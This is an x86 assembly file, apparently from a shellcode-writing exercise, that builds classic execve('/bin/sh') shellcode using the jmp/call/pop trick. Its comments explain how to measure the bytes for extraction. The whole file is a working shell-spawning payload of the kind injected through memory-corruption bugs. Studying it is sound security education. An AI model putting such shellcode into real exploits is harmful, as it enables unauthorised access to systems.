	.file	"dummy.c"
	.text
.globl function
	.type	function, @function
function:
	pushl	%ebp
	movl	%esp, %ebp

	# This is where we construct our shellcode. In order to work
	# out the total to be disassembled we use: address of string
	# - address of jmp + string.

	jmp	jtoc			# Jump down
jtop:
	popl	%esi			# Address of /bin/sh now in %esi

	# Call execve(). We build the array to be passed to execve()
	# on the stack.

	movl	$0x0,%eax		# Zero %eax
	movl	$0x0,0x7(%esi)		# NULL terminate /bin/sh
	push	%eax			# Put NULL on the stack
	push	%esi			# Put address of /bin/sh on stack
	movl	$0x0,%edx		# NULL in %edx
	movl	%esp,%ecx		# Address of array in %ecx
	movl	%esi,%ebx		# Address of /bin/sh in %ebx
	movl	$0xb,%eax		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode and invoke syscall

jtoc:
	call	jtop                    # Go back (pushing return address)
	.string	"/bin/sh"               # The string

	popl	%ebp
	ret
	.size	function, .-function
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$8, %esp
	andl	$-16, %esp
	movl	$0, %eax
	addl	$15, %eax
	addl	$15, %eax
	shrl	$4, %eax
	sall	$4, %eax
	subl	%eax, %esp
	call	function
	movl	$0, %eax
	leave
	ret
	.size	main, .-main
	.section	.note.GNU-stack,"",@progbits
	.ident	"GCC: (GNU) 3.4.6"
